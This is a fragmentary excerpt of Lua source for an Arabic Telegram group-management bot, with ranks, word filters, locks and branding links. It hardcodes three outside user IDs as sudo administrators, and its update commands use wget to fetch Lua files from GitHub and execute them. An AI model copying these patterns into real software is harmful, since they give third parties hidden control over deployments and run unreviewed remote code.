...
if res ~= 200 then
print('\27[0;31m┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉ ┉┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉"
echo "TG IS NOT FIND IN FILES BOT"
echo "┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉ ┉  ₷έℓᗩ┉ ┉ ┉"
...
while(true) do
rm -fr ../.telegram-cli
screen -S SELAA -X kill
screen -S SELAA ./SELAA
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SELAATEAM/Files_SELAA/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1444059892,1059262308,1152127659}   
...
var = true  
elseif tonumber(user_id) == tonumber(1152127659) then
var = true  
...
local SELAA_Msg = ''  
if msgs < 100 then 
SELAA_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
SELAA_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
SELAA_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
SELAA_Msg = 'متفاعل' 
elseif msgs < 1200 then 
SELAA_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
SELAA_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
SELAA_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
SELAA_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
SELAA_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
SELAA_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
SELAA_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
SELAA_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
SELAA_Msg = 'رب التفاعل'  
end 
return SELAA_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceSELAA(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,SELAA_Msg) 
return false  
end 
if text then    
...
if text == 'مسحكليشه ستارت ⌘↯' and SudoBot(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ⌘↯⇠ تم مسحكليشه ستارت')
end
...
os.execute('wget https://raw.githubusercontent.com/fares355/SELAA/main/SELAA.lua')
send(msg.chat_id_, msg.id_,' ⌘↯⇠ تم تحديث السورس \n ⌘↯⇠ لديك اخر اصدار لسورس استيفن\n ⌘↯⇠ الاصدار » { 1.3v}')
dofile('SELAA.lua')  
end
if text == 'الاصدار ⌘↯' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⌘↯⇠ اصدار سورس استيفن\n ⌘↯⇠ الاصدار »{ 1.3v}')
end
...
if text == 'كلبنسخه الاحتياطيه ⌘↯' and SudoBot(msg) then 
GetFile_Bot(msg)
end
...
send(msg.chat_id_, msg.id_,'⌘↯⇠  عدد الجروبات الان » { '..#group..' }'..SELAAk..''..SELAA..'\n⌘↯⇠  الان عدد الجروبات الحقيقي » { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ⌘↯⇠ العضو » ['..result.title_..'](t.me/'..(username or 'SOURCESTIVN_1')..')'
status  = '\n ⌘↯⇠ تم ترقيته مطور'
...
usertext = '\n ⌘↯⇠ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCESTIVN_1')..')'
status  = '\n ⌘↯⇠ تم ترقيته مطور'
...
local SELAA1_Msg = database:get(bot_id.."SELAA1:Add:Filter:Rp2"..text..msg.chat_id_)   
if SELAA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌘↯⇠ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOURCESTIVN_1')..') \n ⌘↯⇠ '..SELAA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if SELAA_Msg and not Special(msg) then  
local SELAA_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if SELAA_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⌘↯⇠ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⌘↯⇠ ["..SELAA_Msg.."] \n")
else
send(msg.chat_id_,0," ⌘↯⇠ العضو : {["..data.first_name_.."](T.ME/SOURCESTIVN_1)}\n ⌘↯⇠ ["..SELAA_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ⌘↯⇠ عذرا » {["..data.first_name_.."](T.ME/SOURCESTIVN_1)}\n ⌘↯⇠ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
↯♡  ━━━  ᵴᵉᴌẤ  ━━━ ↯♡
 ...
 [- The SOURCE channel](https://t.me/SOURCESTIVN_1) ⌘ .
↯♡  ━━━  ᵴᵉᴌẤ  ━━━ ↯♡
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ⌘↯⇠ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOURCESTIVN_1')..') \n ⌘↯⇠ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌘↯⇠ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SOURCESTIVN_1')..') \n ⌘↯⇠ تـم قفـل التاك بالكتم ')
end,nil)   
...
if result.sender_user_id_ == tonumber(1152127659) then
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌘↯⇠ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCESTIVN_1')..')'
status  = '\n ⌘↯⇠ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ⌘↯⇠ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌘↯⇠ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCESTIVN_1')..')'
...
database:set(bot_id.."SELAA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."SELAA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ⌘↯⇠ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."SELAA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."SELAA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."SELAA1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."SELAA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ⌘↯⇠ تم منع الكلمه مع التحذير")  
database:del(bot_id.."SELAA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."SELAA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."SELAA1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."SELAA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ⌘↯⇠ ارسل الكلمه الان")  
database:set(bot_id.."SELAA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."SELAA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."SELAA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."SELAA1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."SELAA1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."SELAA1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."SELAA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."SELAA1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."SELAA1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ⌘↯⇠ قائمة المنع \n≪↯━━━━━━↯ᵴTᏐVᵑ♡━━━━━━━↯≫\n"
for k,v in pairs(list) do  
local SELAA_Msg = database:get(bot_id.."SELAA1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..SELAA_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ⌘↯⇠ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'SOURCESTIVN_1')..')'..'\n ⌘↯⇠ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..SELAA_Msg[math.random(#SELAA_Msg)]..']') 
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCESTIVN_1')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
SELAAdx(msg.chat_id_, msg.id_, ' ⌘↯⇠ ايدي المجموعة » ( '..msg.chat_id_..' )\n ⌘↯⇠ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ⌘↯⇠ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ⌘↯⇠ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
*⌘↯م10 ◂ اوامر الاعضاء*
ٴ≪━━━━━━Sᵉ⍸Ầ━━━━━━≫ٴ 
彡 .[Sᵉ⍸Ầ C𝐇𝐀𝐍𝐍𝐄𝑳](t.me/SOURCESTIVN_1)➢ 
]]
...
send(msg.chat_id_, msg.id_, t.. ٴ◈ٴ么 ◈STIᏉN◈么ٴ◈○ٴ\n◈ 彡 .[𝚂𝙾𝚄𝚁𝙲𝙴 𝙵𝙰𝚂𝚃 𖤐](t.me/SOURCESTIVN_1)➢  )
end
...
SELAA = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(SELAA)
...
--------------------------------------------------------------------------------------------------------------
SourceSELAA(data.message_,data)
...
------------------------------------------------------------------------
local SELAAAbot = database:get(bot_id.."SELAA1:Add:Filter:Rp2"..text..result.chat_id_)   
if SELAAAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⌘↯⇠ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⌘↯⇠ ["..SELAAAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local SELAA1_Msg = database:get(bot_id.."SELAA1:Add:Filter:Rp2"..text..result.chat_id_)   
if SELAA1_Msg then    
send(msg.chat_id_, msg.id_," ⌘↯⇠ "..SELAA1_Msg)
